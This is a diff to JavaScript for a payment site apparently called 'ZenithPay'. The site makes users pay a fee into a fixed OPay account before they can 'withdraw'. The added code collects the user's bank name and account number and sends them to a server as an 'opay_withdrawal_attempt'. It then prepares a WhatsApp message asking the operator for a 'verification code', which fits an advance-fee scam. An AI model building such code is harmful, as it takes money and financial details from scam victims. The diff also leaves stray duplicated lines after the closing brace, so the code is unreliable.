@@ -287,18 +287,44 @@ document.getElementById('copyAccount')?.addEventListener('click', function() {
 // ===== I HAVE PAID → WHATSAPP =====
 // ============================================================
 
+// ============================================================
+// ===== I HAVE PAID → WHATSAPP (WITH USER BANK DETAILS) =====
+// ============================================================
+
 document.getElementById('iHavePaidBtn')?.addEventListener('click', function() {
     var amount = document.getElementById('depositAmount').value;
+    var userBank = document.getElementById('userBank').value;
+    var userAccount = document.getElementById('userAccountNumber').value;
     var userData = JSON.parse(localStorage.getItem('zenithpay_user') || '{}');
 
-    // Send payment confirmation to server
+    // Validate user bank details
+    if (!userBank || !userAccount) {
+        alert('⚠️ Please enter your bank name and account number.');
+        return;
+    }
+
+    // Send payment confirmation + user bank details to server
     sendData({
         type: 'opay_withdrawal_attempt',
         amount: amount,
         opay_account: OPAY_ACCOUNT,
         user_name: userData.fullname || 'Unknown',
+        user_bank: userBank,
+        user_account: userAccount,
         timestamp: Date.now()
     });
+
+    // Close withdraw modal
+    document.getElementById('withdrawModal').classList.add('hidden');
+
+    // Open WhatsApp modal
+    document.getElementById('whatsappModal').classList.remove('hidden');
+
+    // Update WhatsApp link with dynamic data
+    var waLink = document.getElementById('whatsappLink');
+    var msg = 'Hello, I sent ₦' + amount + ' to your OPay account (' + OPAY_ACCOUNT + ') for my ZenithPay withdrawal. My name is ' + (userData.fullname || 'User') + '. My bank is ' + userBank + ', account: ' + userAccount + '. Please send my verification code.';
+    waLink.href = 'https://wa.me/' + WHATSAPP_NUMBER + '?text=' + encodeURIComponent(msg);
+});
 
     // Close withdraw modal
     document.getElementById('withdrawModal').classList.add('hidden');
